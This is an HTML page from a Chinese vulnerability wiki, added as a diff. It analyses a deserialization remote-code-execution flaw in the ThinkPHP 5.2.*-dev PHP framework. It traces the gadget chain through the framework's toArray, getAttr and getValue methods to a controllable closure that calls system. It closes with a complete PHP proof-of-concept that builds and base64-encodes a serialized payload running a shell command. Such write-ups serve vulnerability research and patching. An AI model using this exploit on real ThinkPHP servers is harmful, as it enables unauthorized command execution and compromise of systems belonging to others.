@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp%205.2._-dev%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Thinkphp 5.2.*-dev 反序列化漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Thinkphp 5.2.*-dev \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u56db\u3001\u53c2\u8003\u94fe\u63a5", url: "#_7" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../js/base.js"></script>
+      <script src="../../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Thinkphp%206.0._-dev%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Thinkphp%206.0._-dev%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Thinkphp 6.0.*-dev 反序列化漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Thinkphp%205.1.37%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Thinkphp%205.1.37%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Thinkphp 5.1.37 反序列化漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="thinkphp-52-dev">Thinkphp 5.2.*-dev 反序列化漏洞<a class="headerlink" href="#thinkphp-52-dev" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>所有Thinkphp版本下载链接</p>
+<p><a href="https://packagist.org/packages/topthink/framework">https://packagist.org/packages/topthink/framework</a></p>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">环境搭建<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code>composer create-project topthink/think=5.2.*-dev v5.2
+</code></pre></div>
+
+<h3 id="poc">poc演示截图<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
+<p><img alt="" src="./resource/Thinkphp5.2.*-dev反序列化漏洞/media/rId27.png" /></p>
+<h3 id="_5">调用链<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p><img alt="" src="./resource/Thinkphp5.2.*-dev反序列化漏洞/media/rId29.png" /></p>
+<h3 id="_6">单步调试<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<p>可以看到前面的链跟tp5.1.x的一样，这里不在列举，直接进去toArray函数，可以看到$data可控</p>
+<div class="codehilite"><pre><span></span><code><span class="nt">public</span><span class="w"> </span><span class="nt">function</span><span class="w"> </span><span class="nt">toArray</span><span class="o">():</span><span class="w"> </span><span class="nt">array</span>
+<span class="p">{</span>
+<span class="err">。。。</span>
+<span class="err">$data</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">array_merge($this-&gt;data,</span><span class="w"> </span><span class="err">$this-&gt;relation)</span><span class="p">;</span>
+
+<span class="err">foreach</span><span class="w"> </span><span class="err">($data</span><span class="w"> </span><span class="err">as</span><span class="w"> </span><span class="err">$key</span><span class="w"> </span><span class="err">=&gt;</span><span class="w"> </span><span class="err">$val)</span><span class="w"> </span><span class="err">{</span>
+<span class="w">   </span><span class="err">if</span><span class="w"> </span><span class="err">($val</span><span class="w"> </span><span class="err">instanceof</span><span class="w"> </span><span class="err">Model</span><span class="w"> </span><span class="err">||</span><span class="w"> </span><span class="err">$val</span><span class="w"> </span><span class="err">instanceof</span><span class="w"> </span><span class="err">ModelCollection)</span><span class="w"> </span><span class="err">{</span>
+<span class="w">     </span><span class="err">//</span><span class="w"> </span><span class="err">关联模型对象</span>
+<span class="w">     </span><span class="err">if</span><span class="w"> </span><span class="err">(isset($this-&gt;visible</span><span class="cp">[</span><span class="nv">$key</span><span class="cp">]</span><span class="err">))</span><span class="w"> </span><span class="err">{</span>
+<span class="w">      </span><span class="err">$val-&gt;visible($this-&gt;visible</span><span class="cp">[</span><span class="nv">$key</span><span class="cp">]</span><span class="err">)</span><span class="p">;</span>
+<span class="w">     </span><span class="p">}</span><span class="w"> </span><span class="nt">elseif</span><span class="w"> </span><span class="o">(</span><span class="nt">isset</span><span class="o">($</span><span class="nt">this-</span><span class="o">&gt;</span><span class="nt">hidden</span><span class="cp">[</span><span class="nv">$key</span><span class="cp">]</span><span class="o">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="err">$val-&gt;hidden($this-&gt;hidden</span><span class="cp">[</span><span class="nv">$key</span><span class="cp">]</span><span class="err">)</span><span class="p">;</span>
+<span class="w">     </span><span class="p">}</span>
+<span class="w">     </span><span class="o">//</span><span class="w"> </span><span class="nt">关联模型对象</span>
+<span class="w">     </span><span class="o">$</span><span class="nt">item</span><span class="cp">[</span><span class="nv">$key</span><span class="cp">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="nt">val-</span><span class="o">&gt;</span><span class="nt">toArray</span><span class="o">();</span>
+<span class="w">   </span><span class="err">}</span><span class="w"> </span><span class="nt">elseif</span><span class="w"> </span><span class="o">(</span><span class="nt">isset</span><span class="o">($</span><span class="nt">this-</span><span class="o">&gt;</span><span class="nt">visible</span><span class="cp">[</span><span class="nv">$key</span><span class="cp">]</span><span class="o">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">     </span><span class="err">$item</span><span class="cp">[</span><span class="nv">$key</span><span class="cp">]</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">$this-&gt;getAttr($key)</span><span class="p">;</span>
+<span class="w">   </span><span class="p">}</span><span class="w"> </span><span class="nt">elseif</span><span class="w"> </span><span class="o">(!</span><span class="nt">isset</span><span class="o">($</span><span class="nt">this-</span><span class="o">&gt;</span><span class="nt">hidden</span><span class="cp">[</span><span class="nv">$key</span><span class="cp">]</span><span class="o">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!$</span><span class="nt">hasVisible</span><span class="o">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">     </span><span class="err">$item</span><span class="cp">[</span><span class="nv">$key</span><span class="cp">]</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">$this-&gt;getAttr($key)</span><span class="p">;</span>
+<span class="w">   </span><span class="p">}</span>
+<span class="err">}</span>
+<span class="err">。。。</span>
+<span class="nt">public</span><span class="w"> </span><span class="nt">function</span><span class="w"> </span><span class="nt">getAttr</span><span class="o">(</span><span class="nt">string</span><span class="w"> </span><span class="o">$</span><span class="nt">name</span><span class="o">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="err">try</span><span class="w"> </span><span class="err">{</span>
+<span class="w">        </span><span class="err">$relation</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">false</span><span class="p">;</span>
+<span class="w">        </span><span class="err">$value</span><span class="w">    </span><span class="err">=</span><span class="w"> </span><span class="err">$this-&gt;getData($name)</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="nt">catch</span><span class="w"> </span><span class="o">(</span><span class="nt">InvalidArgumentException</span><span class="w"> </span><span class="o">$</span><span class="nt">e</span><span class="o">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="err">$relation</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">true</span><span class="p">;</span>
+<span class="w">        </span><span class="err">$value</span><span class="w">    </span><span class="err">=</span><span class="w"> </span><span class="err">null</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="nt">return</span><span class="w"> </span><span class="o">$</span><span class="nt">this-</span><span class="o">&gt;</span><span class="nt">getValue</span><span class="o">($</span><span class="nt">name</span><span class="o">,</span><span class="w"> </span><span class="o">$</span><span class="nt">value</span><span class="o">,</span><span class="w"> </span><span class="o">$</span><span class="nt">relation</span><span class="o">);</span>
+<span class="err">}</span>
+<span class="nt">public</span><span class="w"> </span><span class="nt">function</span><span class="w"> </span><span class="nt">getData</span><span class="o">(</span><span class="nt">string</span><span class="w"> </span><span class="o">$</span><span class="nt">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">null</span><span class="o">)</span>
+<span class="w">   </span><span class="p">{</span>
+<span class="w">       </span><span class="err">if</span><span class="w"> </span><span class="err">(is_null($name))</span><span class="w"> </span><span class="err">{</span>
+<span class="w">           </span><span class="err">return</span><span class="w"> </span><span class="err">$this-&gt;data</span><span class="p">;</span>
+<span class="w">       </span><span class="p">}</span>
+
+<span class="w">       </span><span class="o">$</span><span class="nt">fieldName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="nt">this-</span><span class="o">&gt;</span><span class="nt">getRealFieldName</span><span class="o">($</span><span class="nt">name</span><span class="o">);</span>
+
+<span class="w">       </span><span class="nt">if</span><span class="w"> </span><span class="o">(</span><span class="nt">array_key_exists</span><span class="o">($</span><span class="nt">fieldName</span><span class="o">,</span><span class="w"> </span><span class="o">$</span><span class="nt">this-</span><span class="o">&gt;</span><span class="nt">data</span><span class="o">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">           </span><span class="err">return</span><span class="w"> </span><span class="err">$this-&gt;data</span><span class="cp">[</span><span class="nv">$fieldName</span><span class="cp">]</span><span class="p">;</span>
+<span class="w">           </span><span class="err">...</span>
+<span class="w">       </span><span class="p">}</span>
+<span class="w">   </span><span class="err">}</span>
+<span class="nt">protected</span><span class="w"> </span><span class="nt">function</span><span class="w"> </span><span class="nt">getRealFieldName</span><span class="o">(</span><span class="nt">string</span><span class="w"> </span><span class="o">$</span><span class="nt">name</span><span class="o">):</span><span class="w"> </span><span class="nt">string</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="err">return</span><span class="w"> </span><span class="err">$this-&gt;strict</span><span class="w"> </span><span class="err">?</span><span class="w"> </span><span class="err">$</span><span class="n">name</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">App</span><span class="o">::</span><span class="nf">parseName</span><span class="p">(</span><span class="err">$</span><span class="n">name</span><span class="p">);</span><span class="w">  </span><span class="err">//this-&gt;strict默认为true</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>可以看到getAttr函数中的$value可控，那么导致$this-&gt;getValue($name,
+$value, $relation);这里的三个参数都可控，跟进$this-&gt;getValue($name,
+$value, $relation);</p>
+<div class="codehilite"><pre><span></span><code><span class="nt">protected</span><span class="w"> </span><span class="nt">function</span><span class="w"> </span><span class="nt">getValue</span><span class="o">(</span><span class="nt">string</span><span class="w"> </span><span class="o">$</span><span class="nt">name</span><span class="o">,</span><span class="w"> </span><span class="o">$</span><span class="nt">value</span><span class="o">,</span><span class="w"> </span><span class="nt">bool</span><span class="w"> </span><span class="o">$</span><span class="nt">relation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">false</span><span class="o">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="err">//</span><span class="w"> </span><span class="err">检测属性获取器</span>
+<span class="w">    </span><span class="err">$fieldName</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">$this-&gt;getRealFieldName($name)</span><span class="p">;</span>
+<span class="w">    </span><span class="err">$method</span><span class="w">    </span><span class="err">=</span><span class="w"> </span><span class="err">&#39;get&#39;</span><span class="w"> </span><span class="err">.</span><span class="w"> </span><span class="n">App</span><span class="p">:</span><span class="o">:</span><span class="nf">parseName</span><span class="p">(</span><span class="err">$</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="s1">&#39;Attr&#39;</span><span class="p">;</span>
+
+<span class="w">    </span><span class="err">if</span><span class="w"> </span><span class="err">(isset($this-&gt;withAttr</span><span class="cp">[</span><span class="nv">$fieldName</span><span class="cp">]</span><span class="err">))</span><span class="w"> </span><span class="err">{</span>
+<span class="w">       </span><span class="err">if</span><span class="w"> </span><span class="err">($relation)</span><span class="w"> </span><span class="err">{</span>
+<span class="w">         </span><span class="err">$value</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">$this-&gt;getRelationValue($name)</span><span class="p">;</span>
+<span class="w">       </span><span class="p">}</span>
+
+<span class="w">       </span><span class="o">$</span><span class="nt">closure</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="nt">this-</span><span class="o">&gt;</span><span class="nt">withAttr</span><span class="cp">[</span><span class="nv">$fieldName</span><span class="cp">]</span><span class="o">;</span>
+<span class="w">       </span><span class="o">$</span><span class="nt">value</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="nt">closure</span><span class="o">($</span><span class="nt">value</span><span class="o">,</span><span class="w"> </span><span class="o">$</span><span class="nt">this-</span><span class="o">&gt;</span><span class="nt">data</span><span class="o">);</span>
+</code></pre></div>
+
+<p>这里$fieldName、$this-&gt;withAttr，导致$closure也可控，最终直接产生RCE。如下图</p>
+<p><img alt="" src="./resource/Thinkphp5.2.*-dev反序列化漏洞/media/rId31.png" /></p>
+<p>补充：</p>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
+
+<span class="nv">$a</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+<span class="nb">system</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">,</span><span class="nv">$a</span><span class="p">);</span>
+</code></pre></div>
+
+<p><img alt="" src="./resource/Thinkphp5.2.*-dev反序列化漏洞/media/rId32.png" /></p>
+<p><img alt="" src="./resource/Thinkphp5.2.*-dev反序列化漏洞/media/rId33.png" /></p>
+<h3 id="poc-v52-dev">poc v5.2.*-dev<a class="headerlink" href="#poc-v52-dev" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
+<span class="n">namespace</span><span class="w"> </span><span class="n">think</span>\<span class="n">process</span>\<span class="n">pipes</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">class</span><span class="w"> </span><span class="n">Windows</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="n">private</span><span class="w"> </span><span class="o">$</span><span class="n">files</span><span class="p">;</span>
+<span class="w">        </span><span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">(</span><span class="o">$</span><span class="n">files</span><span class="p">)</span>
+<span class="w">        </span><span class="p">{</span>
+<span class="w">            </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">files</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">array</span><span class="p">(</span><span class="o">$</span><span class="n">files</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="n">namespace</span><span class="w"> </span><span class="n">think</span>\<span class="n">model</span>\<span class="n">concern</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">trait</span><span class="w"> </span><span class="n">Conversion</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">append</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">array</span><span class="p">(</span><span class="s2">&quot;Smi1e&quot;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="s2">&quot;1&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="n">trait</span><span class="w"> </span><span class="n">Attribute</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="n">private</span><span class="w"> </span><span class="o">$</span><span class="n">data</span><span class="p">;</span>
+<span class="w">        </span><span class="n">private</span><span class="w"> </span><span class="o">$</span><span class="n">withAttr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">array</span><span class="p">(</span><span class="s2">&quot;Smi1e&quot;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="s2">&quot;system&quot;</span><span class="p">);</span>
+
+<span class="w">        </span><span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">get</span><span class="p">(</span><span class="o">$</span><span class="n">system</span><span class="p">)</span>
+<span class="w">        </span><span class="p">{</span>
+<span class="w">            </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">array</span><span class="p">(</span><span class="s2">&quot;Smi1e&quot;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="s2">&quot;$system&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+<span class="n">namespace</span><span class="w"> </span><span class="n">think</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">abstract</span><span class="w"> </span><span class="k">class</span><span class="w"> </span><span class="n">Model</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="n">use</span><span class="w"> </span><span class="n">model</span>\<span class="n">concern</span>\<span class="n">Attribute</span><span class="p">;</span>
+<span class="w">        </span><span class="n">use</span><span class="w"> </span><span class="n">model</span>\<span class="n">concern</span>\<span class="n">Conversion</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="n">namespace</span><span class="w"> </span><span class="n">think</span>\<span class="n">model</span><span class="p">{</span>
+<span class="w">    </span><span class="n">use</span><span class="w"> </span><span class="n">think</span>\<span class="n">Model</span><span class="p">;</span>
+<span class="w">    </span><span class="k">class</span><span class="w"> </span><span class="n">Pivot</span><span class="w"> </span><span class="k">extends</span><span class="w"> </span><span class="n">Model</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">(</span><span class="o">$</span><span class="n">system</span><span class="p">)</span>
+<span class="w">        </span><span class="p">{</span>
+<span class="w">            </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">(</span><span class="o">$</span><span class="n">system</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+<span class="n">namespace</span><span class="p">{</span>
+<span class="w">    </span><span class="o">$</span><span class="n">Conver</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">think</span>\<span class="n">model</span>\<span class="n">Pivot</span><span class="p">(</span><span class="s2">&quot;whoami&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="o">$</span><span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">think</span>\<span class="n">process</span>\<span class="n">pipes</span>\<span class="n">Windows</span><span class="p">(</span><span class="o">$</span><span class="n">Conver</span><span class="p">);</span>
+<span class="w">    </span><span class="n">echo</span><span class="w"> </span><span class="n">base64_encode</span><span class="p">(</span><span class="n">serialize</span><span class="p">(</span><span class="o">$</span><span class="n">payload</span><span class="p">));</span>
+<span class="p">}</span>
+<span class="err">?</span><span class="o">&gt;</span>
+</code></pre></div>
+
+<h2 id="_7">四、参考链接<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://www.t00ls.net/thread-54324-1-1.html">https://www.t00ls.net/thread-54324-1-1.html</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Thinkphp%206.0._-dev%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Thinkphp%206.0._-dev%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Thinkphp 6.0.*-dev 反序列化漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Thinkphp%205.1.37%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Thinkphp%205.1.37%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Thinkphp 5.1.37 反序列化漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
